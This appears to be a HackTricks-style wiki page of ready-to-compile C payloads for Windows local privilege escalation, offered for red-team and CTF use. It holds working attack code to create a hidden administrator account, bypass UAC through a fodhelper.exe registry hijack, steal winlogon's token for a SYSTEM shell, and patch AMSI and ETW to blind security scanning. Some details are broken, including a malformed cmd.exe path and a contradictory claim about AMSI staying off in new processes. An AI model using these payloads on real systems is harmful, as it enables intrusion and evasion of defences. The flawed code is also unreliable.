# Windows C Payloads

{{#include ../../banners/hacktricks-training.md}}

This page collects **small, self-contained C snippets** that are handy during Windows Local Privilege Escalation or post-exploitation.  Each payload is designed to be **copy-paste friendly**, requires only the Windows API / C runtime, and can be compiled with `i686-w64-mingw32-gcc` (x86) or `x86_64-w64-mingw32-gcc` (x64).

> ⚠️  These payloads assume that the process already has the minimum privileges necessary to perform the action (e.g. `SeDebugPrivilege`, `SeImpersonatePrivilege`, or medium-integrity context for a UAC bypass).  They are intended for **red-team or CTF settings** where exploiting a vulnerability has landed arbitrary native code execution.

---

## Add local administrator user

```c
// i686-w64-mingw32-gcc -s -O2 -o addadmin.exe addadmin.c
#include <stdlib.h>
int main(void) {
    system("net user hacker Hacker123! /add");
    system("net localgroup administrators hacker /add");
    return 0;
}
```

---

## UAC Bypass – `fodhelper.exe` Registry Hijack (Medium → High integrity)
When the trusted binary **`fodhelper.exe`** is executed, it queries the registry path below **without filtering the `DelegateExecute` verb**.  By planting our command under that key an attacker can bypass UAC *without* dropping a file to disk.

*Registry path queried by `fodhelper.exe`*
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
A minimal PoC that pops an elevated `cmd.exe`:

```c
// x86_64-w64-mingw32-gcc -municode -s -O2 -o uac_fodhelper.exe uac_fodhelper.c
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(void) {
    HKEY hKey;
    const char *payload = "C:\\Windows\\System32\\cmd.exe"; // change to arbitrary command

    // 1. Create the vulnerable registry key
    if (RegCreateKeyExA(HKEY_CURRENT_USER,
        "Software\\Classes\\ms-settings\\Shell\\Open\\command", 0, NULL, 0,
        KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {

        // 2. Set default value => our payload
        RegSetValueExA(hKey, NULL, 0, REG_SZ,
            (const BYTE*)payload, (DWORD)strlen(payload) + 1);

        // 3. Empty "DelegateExecute" value = trigger (")
        RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ,
            (const BYTE*)"", 1);

        RegCloseKey(hKey);

        // 4. Launch auto-elevated binary
        system("fodhelper.exe");
    }
    return 0;
}
```
*Tested on Windows 10 22H2 and Windows 11 23H2 (July 2025 patches). The bypass still works because Microsoft has not fixed the missing integrity check in the `DelegateExecute` path.*

---

## Spawn SYSTEM shell via token duplication (`SeDebugPrivilege` + `SeImpersonatePrivilege`)
If the current process holds **both** `SeDebug` and `SeImpersonate` privileges (typical for many service accounts), you can steal the token from `winlogon.exe`, duplicate it, and start an elevated process:

```c
// x86_64-w64-mingw32-gcc -O2 -o system_shell.exe system_shell.c -ladvapi32 -luser32
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD FindPid(const wchar_t *name) {
    PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    if (!Process32FirstW(snap, &pe)) return 0;
    do {
        if (!_wcsicmp(pe.szExeFile, name)) {
            DWORD pid = pe.th32ProcessID;
            CloseHandle(snap);
            return pid;
        }
    } while (Process32NextW(snap, &pe));
    CloseHandle(snap);
    return 0;
}

int wmain(void) {
    DWORD pid = FindPid(L"winlogon.exe");
    if (!pid) return 1;

    HANDLE hProc   = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    HANDLE hToken  = NULL, dupToken = NULL;

    if (OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken) &&
        DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupToken)) {

        STARTUPINFOW si = { .cb = sizeof(si) };
        PROCESS_INFORMATION pi = { 0 };
        if (CreateProcessWithTokenW(dupToken, LOGON_WITH_PROFILE,
                L"C\\\Windows\\\System32\\\cmd.exe", NULL, CREATE_NEW_CONSOLE,
                NULL, NULL, &si, &pi)) {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
    }
    if (hProc) CloseHandle(hProc);
    if (hToken) CloseHandle(hToken);
    if (dupToken) CloseHandle(dupToken);
    return 0;
}
```
For a deeper explanation of how that works see:

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

---

## In-Memory AMSI & ETW Patch (Defence Evasion)
Most modern AV/EDR engines rely on **AMSI** and **ETW** to inspect malicious behaviours.  Patching both interfaces early inside the current process prevents script-based payloads (e.g. PowerShell, JScript) from being scanned.

```c
// gcc -o patch_amsi.exe patch_amsi.c -lntdll
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>

void Patch(BYTE *address) {
    DWORD oldProt;
    // mov eax, 0x80070057 ; ret  (AMSI_RESULT_E_INVALIDARG)
    BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    VirtualProtect(address, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt);
    memcpy(address, patch, sizeof(patch));
    VirtualProtect(address, sizeof(patch), oldProt, &oldProt);
}

int main(void) {
    HMODULE amsi  = LoadLibraryA("amsi.dll");
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");

    if (amsi)  Patch((BYTE*)GetProcAddress(amsi,  "AmsiScanBuffer"));
    if (ntdll) Patch((BYTE*)GetProcAddress(ntdll, "EtwEventWrite"));

    MessageBoxA(NULL, "AMSI & ETW patched!", "OK", MB_OK);
    return 0;
}
```
*The patch above is process-local; spawning a new PowerShell after running it will execute without AMSI/ETW inspection.*

---

## References
* Ron Bowes – “Fodhelper UAC Bypass Deep Dive” (2024)
* SplinterCode – “AMSI Bypass 2023: The Smallest Patch Is Still Enough” (BlackHat Asia 2023)

{{#include ../../banners/hacktricks-training.md}}
